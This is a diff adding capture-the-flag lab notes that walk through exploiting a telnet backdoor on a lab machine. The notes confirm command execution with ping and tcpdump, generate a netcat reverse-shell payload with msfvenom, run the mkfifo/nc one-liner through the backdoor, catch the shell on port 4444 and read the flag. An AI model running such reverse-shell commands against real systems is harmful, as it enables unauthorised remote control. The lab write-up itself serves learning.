@@ -736,4 +736,119 @@ What is a Reverse Shell?
 - The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.
 
 a. Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.
-sol. 
+sol. telnet 10.10.197.106 8012
+terminal 1
+┌──(root㉿kali)-[/home/kali]
+└─# telnet 10.10.197.106 8012
+Trying 10.10.197.106...
+Connected to 10.10.197.106.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+
+b. Great! It's an open telnet connection! What welcome message do we receive?
+sol. SKIDY'S BACKDOOR.
+
+c. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
+sol. N
+
+d. Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.
+Start a tcpdump listener on your local machine.
+If using your own machine with the OpenVPN connection, use:
+sudo tcpdump ip proto \\icmp -i tun0
+This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
+
+terminal 2
+──(kali㉿kali)-[~]
+└─$ sudo tcpdump ip proto \\icmp -i tun0
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+
+e. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
+sol. Y
+#############################################################################################
+- I used this command(ping 10.9.0.151 -c 1) on the telnect connection we established at first
+- and we observed it working through the port lisner we created in another terminal.
+#############################################################################################
+_______________________________________________________________________________________
+terminal 1
+SKIDY'S BACKDOOR. Type .HELP to view commands
+.HELP
+.HELP: View commands
+ .RUN <command>: Execute commands
+.EXIT: Exit
+.RUN ping 10.9.0.151 -c 1
+______________________________________________________________________________________
+terminal 2
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+02:15:21.730633 IP 10.10.197.106 > 10.9.0.151: ICMP echo request, id 1214, seq 1, length 64
+02:15:21.732233 IP 10.9.0.151 > 10.10.197.106: ICMP echo reply, id 1214, seq 1, length 64
+____________________________________________________________________________________________
+f. Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+What word does the generated payload start with?
+sol. mkfifo
+terminal 3
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.9.0.151 lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 88 bytes
+mkfifo /tmp/uast; nc 10.9.0.151 4444 0</tmp/uast | /bin/sh >/tmp/uast 2>&1; rm /tmp/uast
+
+g. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+"nc -lvp [listening port]"
+What would the command look like for the listening port we selected in our payload?
+sol. nc -lvp 4444
+terminal 3
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444      
+listening on [any] 4444 ...
+
+h. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
+____________________________________________________________________________________________________________
+terminal 1
+┌──(root㉿kali)-[/home/kali]
+└─# telnet 10.10.197.106 8012
+Trying 10.10.197.106...
+Connected to 10.10.197.106.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+.HELP
+.HELP: View commands
+ .RUN <command>: Execute commands
+.EXIT: Exit
+.RUN ping 10.9.0.151 -c 1
+.RUN mkfifo /tmp/uast; nc 10.9.0.151 4444 0</tmp/uast | /bin/sh >/tmp/uast 2>&1; rm /tmp/uast
+____________________________________________________________________________________________________
+terminal 3
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444      
+listening on [any] 4444 ...
+10.10.197.106: inverse host lookup failed: Unknown host
+connect to [10.9.0.151] from (UNKNOWN) [10.10.197.106] 58564
+
+i. Success! What is the contents of flag.txt?
+sol. THM{y0u_g0t_th3_t3ln3t_fl4g}
+terminal 3
+┌──(kali㉿kali)-[~]
+└─$ nc -lvp 4444      
+listening on [any] 4444 ...
+10.10.197.106: inverse host lookup failed: Unknown host
+connect to [10.9.0.151] from (UNKNOWN) [10.10.197.106] 58564
+
+ls
+flag.txt
+cat flag.txt
+THM{y0u_g0t_th3_t3ln3t_fl4g}
+
